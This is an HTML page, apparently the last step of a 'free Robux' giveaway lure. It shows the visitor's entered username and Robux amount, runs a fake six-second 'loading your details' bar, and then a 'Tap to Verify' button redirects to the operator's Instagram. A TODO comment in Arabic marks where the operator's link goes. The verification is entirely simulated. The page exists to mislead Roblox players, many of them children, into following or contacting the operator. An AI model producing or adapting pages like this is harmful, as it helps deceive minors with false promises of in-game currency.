<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verify</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#ffffff; --text:#0e1330; --muted:#6b738a;
      --card:#ffffff; --stroke:#e7eaf3; --radius:18px;
      --accent:#2563eb; --accent-2:#06b6d4;
      --shadow:0 12px 36px #0b102005;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{ margin:0; background:var(--bg); color:var(--text); font-family:Inter,system-ui,Segoe UI,Roboto,Arial,Helvetica,sans-serif }

    .wrap{ min-height:100dvh; display:grid; place-items:center; padding:24px 16px }
    .card{
      width:min(720px, 96vw); background:var(--card);
      border:1px solid var(--stroke); border-radius:var(--radius);
      box-shadow:var(--shadow); padding:24px 18px 26px;
      text-align:center;
    }
    h1{ margin:6px 0 8px; font-size:clamp(1.4rem,1.1rem + 1.2vw,2rem) }
    .muted{ color:var(--muted) }

    .pillbox{
      margin:14px auto 12px; display:flex; gap:10px; justify-content:center; flex-wrap:wrap;
    }
    .pill{ background:#f4f7ff; border:1px solid var(--stroke); border-radius:999px; padding:8px 12px; font-weight:800 }

    .bar-wrap{ margin:18px 0 12px; text-align:left }
    .bar-outer{
      position:relative; height:14px; background:#f1f5ff; border:1px solid var(--stroke); border-radius:10px; overflow:hidden;
    }
    .fill{ position:absolute; inset:0; width:0%; background:linear-gradient(90deg,var(--accent),var(--accent-2)); transition:width .2s linear }
    .time{ text-align:right; color:#8a94ad; font-size:.92rem; margin-top:6px }

    .btn{
      --g1:#60a5fa; --g2:#22d3ee;
      margin-top:14px;
      border:none; color:#05202a; font-weight:900; letter-spacing:.02em;
      background:linear-gradient(90deg, var(--g1), var(--g2));
      padding:15px 22px; border-radius:14px; cursor:pointer; font-size:17px; width:100%;
      box-shadow:0 14px 30px #22d3ee33, inset 0 -2px 0 #00000020;
      transition: transform .15s ease, filter .2s ease, opacity .2s ease;
    }
    .btn[disabled]{ opacity:.45; cursor:not-allowed }
    .btn:not([disabled]):hover{ transform: translateY(-2px) }
  </style>
</head>
<body>
  <main class="wrap">
    <section class="card" role="region" aria-label="Verification">
      <div class="muted">Verify</div>
      <h1>Final step</h1>
      <p class="muted">We’re loading your details. Hang tight for a few seconds.</p>

      <div class="pillbox">
        <div class="pill" id="uPill">User: —</div>
        <div class="pill" id="rPill">Robux: —</div>
      </div>

      <div class="bar-wrap">
        <div class="bar-outer"><div class="fill" id="fill"></div></div>
        <div class="time"><span id="sec">6</span>s</div>
      </div>

      <button id="verifyBtn" class="btn" disabled>Tap to Verify</button>

      <p class="muted" style="margin-top:10px">Need help? Reach out on Instagram after you tap verify.</p>
    </section>
  </main>

  <script>
    // Read data (localStorage first, then query)
    function readData(){
      let data = null;
      try{
        const raw = localStorage.getItem('rbx_entry');
        if(raw) data = JSON.parse(raw);
      }catch(e){}
      if(!data){
        const sp = new URLSearchParams(location.search);
        const u = sp.get('u'); const r = Number(sp.get('r')||0);
        if(u && r){ data = {u, r} }
      }
      return data;
    }

    const data = readData();
    const uPill = document.getElementById('uPill');
    const rPill = document.getElementById('rPill');
    const fill  = document.getElementById('fill');
    const secEl = document.getElementById('sec');
    const btn   = document.getElementById('verifyBtn');

    if(!data || !data.u || !data.r){
      window.location.replace('index.html');
    }else{
      uPill.textContent = `User: ${data.u}`;
      rPill.textContent = `Robux: ${data.r.toLocaleString()}`
      runProgress();
    }

    function runProgress(){
      const totalMs = 6000; // 6 seconds
      const started = performance.now();
      const tick = (now)=>{
        const elapsed = now - started;
        const pct = Math.min(1, elapsed / totalMs);
        fill.style.width = (pct*100).toFixed(2) + '%';
        const remain = Math.max(0, Math.ceil((totalMs - elapsed)/1000));
        secEl.textContent = remain;
        if(pct < 1){ requestAnimationFrame(tick) } else { btn.disabled = false }
      };
      requestAnimationFrame(tick);
    }

    // TODO: ضع رابط إنستقرامك هنا
    const INSTAGRAM_URL = "https://instagram.com/YOUR_USERNAME";

    btn.addEventListener('click', ()=>{
      window.location.href = INSTAGRAM_URL;
    });
  </script>
</body>
</html>
